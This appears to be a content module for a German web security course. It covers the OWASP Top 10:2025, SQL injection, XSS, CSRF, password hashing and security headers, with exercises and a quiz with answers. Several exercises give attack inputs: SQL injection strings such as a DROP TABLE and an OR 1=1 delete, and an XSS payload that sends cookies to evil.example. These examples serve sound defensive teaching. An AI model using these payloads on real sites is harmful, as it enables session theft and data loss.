/** @type {import('../topicsData').TopicContent} */
export default {
  learningGoals: [
    'Die OWASP Top 10:2025 benennen und typische Beispiele zuordnen',
    'SQL-Injection, Cross-Site Scripting und CSRF erklären und wirksam verhindern',
    'Passwörter nach aktuellem Stand speichern (Argon2id/bcrypt, Salt) und MFA einordnen',
    'Wichtige Security-Header und Maßnahmen gegen Supply-Chain-Angriffe nennen'
  ],
  content: `
## Die OWASP Top 10:2025

Das **Open Worldwide Application Security Project (OWASP)** veröffentlicht regelmäßig die zehn kritischsten Risikokategorien für Webanwendungen. Die aktuelle Fassung ist von 2025:

| Rang | Kategorie | Typisches Beispiel |
| :---: | :--- | :--- |
| A01 | Broken Access Control | \`/api/rechnungen/1043\` zeigt fremde Rechnungen, wenn man die ID ändert (IDOR); umfasst jetzt auch SSRF |
| A02 | Security Misconfiguration | Standardpasswörter, offene Admin-Oberflächen, ausführliche Fehlermeldungen in Produktion |
| A03 | Software Supply Chain Failures | kompromittiertes npm-Paket, veraltete Bibliothek mit bekannter Lücke |
| A04 | Cryptographic Failures | Passwörter als MD5 gespeichert, HTTP statt HTTPS |
| A05 | Injection | SQL-Injection, Command Injection, Cross-Site Scripting |
| A06 | Insecure Design | Passwort-Reset nur über „Sicherheitsfrage“, kein Rate-Limit by Design |
| A07 | Authentication Failures | kein Schutz gegen Credential Stuffing, Sitzungen laufen nie ab |
| A08 | Software or Data Integrity Failures | Updates ohne Signaturprüfung, unsichere Deserialisierung |
| A09 | Security Logging and Alerting Failures | Angriffe werden nicht protokolliert oder lösen keinen Alarm aus |
| A10 | Mishandling of Exceptional Conditions | Fehler führen zu „fail open“, z. B. Zugriff erlaubt, wenn der Rechtedienst nicht antwortet |

Gegenüber 2021 ist **Security Misconfiguration** auf Platz 2 gestiegen, **Supply Chain** und **Exceptional Conditions** sind neu, und SSRF ist in A01 aufgegangen.

## SQL-Injection

Bei einer **Injection** wird Nutzereingabe als **Befehl** interpretiert statt als **Daten**. Der Klassiker ist die SQL-Injection:

![Vergleich: zusammengesetzte Zeichenkette vs. Prepared Statement](sql-injection.svg "Mit Platzhaltern bleibt die Eingabe ein Wert und wird nie Teil des SQL-Befehls")

Mit Eingaben wie \`'; DROP TABLE users; --\` lassen sich bei manchen Datenbanktreibern sogar weitere Befehle anhängen, mit \`UNION SELECT\` fremde Tabellen auslesen.

**Schutz:**

1. **Prepared Statements / parametrisierte Abfragen** – die wichtigste Maßnahme. Befehl und Daten gehen getrennt an die Datenbank.
2. ORM oder Query-Builder richtig nutzen (keine rohen String-Abfragen).
3. **Least Privilege**: Die Anwendung verbindet sich mit einem Datenbanknutzer, der nur die nötigen Rechte hat (kein \`DROP\`, kein Admin).
4. **Eingaben validieren** (Typ, Länge, erlaubte Zeichen) – als zusätzliche Verteidigungslinie, nicht als Ersatz für 1.

> [!warning] Escaping ist kein Ersatz
> Selbstgebautes Escaping von Anführungszeichen vergisst früher oder später einen Sonderfall (Zeichensätze, numerische Felder ohne Quotes). Prepared Statements lösen das Problem grundsätzlich.

## Cross-Site Scripting (XSS)

Bei XSS bringt ein Angreifer **eigenes JavaScript** in eine fremde Seite. Es läuft dann im Browser des Opfers mit dessen Rechten: Es kann Sitzungs-Cookies stehlen, Formulare manipulieren oder im Namen des Opfers handeln.

| Art | Wie gelangt der Code in die Seite? |
| :--- | :--- |
| **Stored XSS** | wird gespeichert (Kommentar, Profilname) und jedem Besucher ausgeliefert |
| **Reflected XSS** | steckt in der URL und wird vom Server direkt zurückgegeben (z. B. Suchbegriff) |
| **DOM-based XSS** | clientseitiges JavaScript schreibt unsichere Daten ins DOM (\`innerHTML\`) |

**Schutz:**

- **Kontextgerechtes Output-Encoding**: \`<\` wird zu \`&lt;\` usw. Frameworks wie React tun das automatisch – solange man nicht \`dangerouslySetInnerHTML\` oder \`innerHTML\` mit Nutzerdaten verwendet.
- Muss HTML erlaubt sein: mit einer Bibliothek wie DOMPurify bereinigen.
- **Content Security Policy (CSP)**: verbietet Inline-Skripte und fremde Skriptquellen – dann läuft eingeschleuster Code nicht.
- Cookies mit **HttpOnly** markieren, damit JavaScript sie nicht lesen kann.

## Cross-Site Request Forgery (CSRF)

Das Opfer ist bei seiner Bank angemeldet und besucht eine präparierte Seite. Diese schickt im Hintergrund ein Formular an die Bank – der Browser hängt das Sitzungs-Cookie automatisch an, die Bank führt die Überweisung aus.

**Schutz:** Cookies mit **SameSite=Lax** oder **Strict**, **CSRF-Token** in Formularen, die ein Angreifer nicht kennt, und für kritische Aktionen eine erneute Bestätigung (Passwort, zweiter Faktor).

## Passwörter sicher speichern

Passwörter werden **nie im Klartext** und **nie verschlüsselt** gespeichert, sondern mit einem **langsamen Passwort-Hashverfahren** und **Salt**:

- **Salt**: eine zufällige, pro Benutzer neue Zeichenfolge, die vor dem Hashen angehängt und mit gespeichert wird. Gleiche Passwörter ergeben dadurch verschiedene Hashes, und vorberechnete Tabellen (**Rainbow Tables**) nützen nichts.
- **Langsam mit Absicht**: Ein normaler SHA-256 lässt sich auf Grafikkarten milliardenfach pro Sekunde berechnen. Passwort-Hashes kosten bewusst Rechenzeit und Speicher.
- **Empfohlen (OWASP)**: **Argon2id** (mindestens 19 MiB Speicher, 2 Iterationen, Parallelität 1), alternativ **scrypt** oder **bcrypt** (Kostenfaktor mindestens 10).
- **Pepper** (optional): ein geheimer Zusatzwert, der *nicht* in der Datenbank liegt.

Dazu gehören: **Multi-Faktor-Authentifizierung** (Wissen + Besitz + Inhärenz, z. B. Passwort + Authenticator-App), Sperren oder Verzögern nach Fehlversuchen, Abgleich mit Listen geleakter Passwörter und **Passkeys** (WebAuthn) als phishing-resistente Alternative.

## Security-Header

| Header | Wirkung |
| :--- | :--- |
| \`Content-Security-Policy\` | legt erlaubte Quellen für Skripte, Styles, Bilder, Frames fest |
| \`Strict-Transport-Security\` (HSTS) | Browser nutzt nur noch HTTPS für die Domain |
| \`X-Content-Type-Options: nosniff\` | verhindert, dass der Browser den Dateityp errät |
| \`X-Frame-Options\` / CSP \`frame-ancestors\` | verhindert Einbetten in fremde Seiten (Clickjacking) |
| \`Referrer-Policy\` | begrenzt, welche URL-Informationen an andere Seiten gehen |

Diese App liefert alle genannten Header aus, ihre CSP erlaubt auf der Hauptseite weder \`unsafe-eval\` noch Inline-Skripte.

## Supply Chain absichern

Moderne Anwendungen bestehen zum Großteil aus fremdem Code. Maßnahmen: **Lockfiles** einchecken (\`package-lock.json\`), Abhängigkeiten regelmäßig prüfen (\`npm audit\`, Dependabot), nur nötige Pakete installieren, CI-Aktionen auf feste Versionen (Commit-SHA) pinnen, eine **SBOM** (Software Bill of Materials) erstellen und Secrets nie ins Repository einchecken (Pre-Commit-Hooks, Secret-Scanner).
`,
  codeSnippet: `// Node.js mit PostgreSQL (pg): parametrisierte Abfrage
const { rows } = await pool.query(
  'SELECT id, name FROM users WHERE email = $1 AND aktiv = $2',
  [emailAusFormular, true]
);

// Passwort mit Argon2id hashen und prüfen (Paket "argon2")
import argon2 from 'argon2';
const hash = await argon2.hash(passwort, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 });
const ok = await argon2.verify(hash, eingabe); // Salt steckt im Hash-String`,
  codeLanguage: 'JavaScript',
  exercises: [
    {
      id: 'owasp-zuordnen',
      title: 'Schwachstellen einordnen',
      prompt: 'Ordne jeden Fund einer Kategorie der OWASP Top 10:2025 zu:\n\n1. Ein eingeloggter Kunde sieht fremde Bestellungen, wenn er in der URL `/orders/1001` zu `/orders/1002` ändert.\n2. Die Produktionsumgebung zeigt bei Fehlern den kompletten Stacktrace mit Datenbank-Passwort.\n3. Das Suchfeld übernimmt die Eingabe direkt in die SQL-Abfrage.\n4. Passwörter liegen als ungesalzene SHA-1-Hashes in der Datenbank.\n5. Fehlgeschlagene Logins werden nirgends protokolliert.',
      solution: '1. **A01 Broken Access Control** (IDOR – Objekt-ID ohne Rechteprüfung)\n2. **A02 Security Misconfiguration**\n3. **A05 Injection**\n4. **A04 Cryptographic Failures** (und A07, weil die Authentifizierung dadurch angreifbar wird)\n5. **A09 Security Logging and Alerting Failures**'
    },
    {
      id: 'sqli-fixen',
      title: 'SQL-Injection beheben',
      prompt: 'Ein Kollege hat folgenden Code geschrieben. Erkläre den Angriff mit der Eingabe `0 OR 1=1` und schreibe die Abfrage sicher um.\n\n```js\nconst sql = "DELETE FROM notizen WHERE id = " + req.query.id;\nawait db.query(sql);\n```',
      solution: 'Mit `id=0 OR 1=1` entsteht `DELETE FROM notizen WHERE id = 0 OR 1=1` – die Bedingung ist für jede Zeile wahr, **alle Notizen werden gelöscht**. Weil der Wert numerisch ist, helfen nicht einmal Anführungszeichen.\n\nSicher:\n\n```js\nawait db.query(\'DELETE FROM notizen WHERE id = $1 AND besitzer = $2\', [Number(req.query.id), req.user.id]);\n```\n\nZusätzlich wird geprüft, dass die Notiz dem angemeldeten Nutzer gehört (A01).'
    },
    {
      id: 'passwort-speicherung',
      title: 'Passwortspeicherung bewerten',
      prompt: 'Bewerte die drei Varianten und begründe: (A) Passwort mit AES verschlüsselt, Schlüssel in der Konfigurationsdatei. (B) SHA-256 des Passworts ohne Salt. (C) Argon2id mit zufälligem Salt pro Benutzer.',
      solution: '**A – unsicher**: Wer Datenbank und Konfiguration erbeutet, entschlüsselt alle Passwörter im Klartext. Passwörter müssen nie wieder lesbar sein.\n\n**B – unsicher**: SHA-256 ist sehr schnell (Brute Force auf GPUs), ohne Salt haben gleiche Passwörter gleiche Hashes und Rainbow Tables funktionieren.\n\n**C – Stand der Technik**: langsam und speicherhart, Salt verhindert Rainbow Tables und macht gleiche Passwörter unterscheidbar.'
    },
    {
      id: 'xss-kommentar',
      title: 'XSS in der Kommentarfunktion',
      prompt: 'Ein Nutzer speichert als Kommentar `<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">`. Welche XSS-Art ist das, was passiert bei anderen Besuchern, und welche drei Maßnahmen helfen?',
      solution: '**Stored XSS**: Der Kommentar wird gespeichert und jedem Besucher ausgeliefert. Weil das Bild nicht lädt, führt der Browser `onerror` aus und schickt die Cookies des Besuchers an den Angreifer (Session-Hijacking).\n\nMaßnahmen: (1) **Output-Encoding** beim Anzeigen (Text statt HTML ausgeben), (2) **Content Security Policy** ohne `unsafe-inline` und mit eingeschränktem `connect-src`, (3) Sitzungscookie mit **HttpOnly**, damit `document.cookie` es nicht enthält.'
    }
  ],
  quiz: [
    {
      question: 'Welche Kategorie steht in den OWASP Top 10:2025 auf Platz 1?',
      options: ['Injection', 'Broken Access Control', 'Cryptographic Failures', 'Security Misconfiguration'],
      correct: 1,
      explanation: 'Broken Access Control bleibt auf Platz 1. Security Misconfiguration ist auf Platz 2 gestiegen, Injection auf Platz 5 gefallen.'
    },
    {
      question: 'Welche Maßnahme verhindert SQL-Injection grundsätzlich?',
      options: ['Eingaben in Großbuchstaben umwandeln', 'Prepared Statements mit Parametern', 'Die Datenbank verschlüsseln', 'Einen längeren Primärschlüssel verwenden'],
      correct: 1,
      explanation: 'Parametrisierte Abfragen trennen Befehl und Daten, sodass Eingaben nie als SQL interpretiert werden.'
    },
    {
      question: 'Wozu dient ein Salt beim Speichern von Passwörtern?',
      options: [
        'Es macht das Hashen schneller',
        'Es sorgt dafür, dass gleiche Passwörter unterschiedliche Hashes ergeben und Rainbow Tables nutzlos sind',
        'Es ersetzt das Passwort',
        'Es verschlüsselt den Hash'
      ],
      correct: 1,
      explanation: 'Der zufällige Salt pro Benutzer verhindert vorberechnete Tabellen und das Erkennen gleicher Passwörter.'
    },
    {
      question: 'Welches Cookie-Attribut verhindert, dass JavaScript das Cookie lesen kann?',
      options: ['Secure', 'SameSite', 'HttpOnly', 'Max-Age'],
      correct: 2,
      explanation: 'HttpOnly. Secure erzwingt HTTPS, SameSite schützt vor CSRF.'
    },
    {
      question: 'Was beschreibt CSRF?',
      options: [
        'Ein Angreifer liest den Datenbankinhalt aus',
        'Eine fremde Seite löst im Namen des eingeloggten Opfers eine Aktion bei einer anderen Anwendung aus',
        'JavaScript wird dauerhaft in eine Seite eingeschleust',
        'Ein Server wird mit Anfragen überflutet'
      ],
      correct: 1,
      explanation: 'Cross-Site Request Forgery nutzt aus, dass der Browser Cookies automatisch mitschickt.'
    },
    {
      question: 'Welches Verfahren empfiehlt OWASP vorrangig für die Passwortspeicherung?',
      options: ['MD5', 'SHA-256', 'Argon2id', 'Base64'],
      correct: 2,
      explanation: 'Argon2id ist langsam und speicherhart. MD5 und SHA-256 sind zu schnell, Base64 ist gar kein Schutz.'
    },
    {
      question: 'Welcher Header zwingt den Browser, eine Domain nur noch per HTTPS aufzurufen?',
      options: ['Content-Security-Policy', 'Strict-Transport-Security', 'X-Content-Type-Options', 'Referrer-Policy'],
      correct: 1,
      explanation: 'HSTS (Strict-Transport-Security) speichert im Browser, dass die Domain nur über HTTPS erreichbar sein darf.'
    }
  ],
  relatedLabs: [
    { id: 'owasp_exploit_lab', label: 'OWASP-Exploit-Lab' },
    { id: 'ctf_lab', label: 'Capture the Flag' },
    { id: 'cors_pitfalls_lab', label: 'CORS-Fallstricke' },
    { id: 'webauthn_passkey_lab', label: 'Passkeys (WebAuthn)' }
  ],
  sources: [
    { title: 'OWASP Top 10:2025', url: 'https://top10.owasp.org/2025/' },
    { title: 'OWASP Cheat Sheet: SQL Injection Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
    { title: 'OWASP Cheat Sheet: Cross Site Scripting Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
    { title: 'OWASP Cheat Sheet: Password Storage', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html', note: 'Argon2id-Parameter' },
    { title: 'OWASP Cheat Sheet: Cross-Site Request Forgery Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html' },
    { title: 'MDN: Content Security Policy (CSP)', url: 'https://developer.mozilla.org/de/docs/Web/HTTP/Guides/CSP' },
    { title: 'BSI: Sichere Passwörter erstellen', url: 'https://www.bsi.bund.de/DE/Themen/Verbraucherinnen-und-Verbraucher/Informationen-und-Empfehlungen/Cyber-Sicherheitsempfehlungen/Accountschutz/Sichere-Passwoerter-erstellen/sichere-passwoerter-erstellen_node.html' }
  ],
  sourcesCheckedOn: '29.10.2026'
};
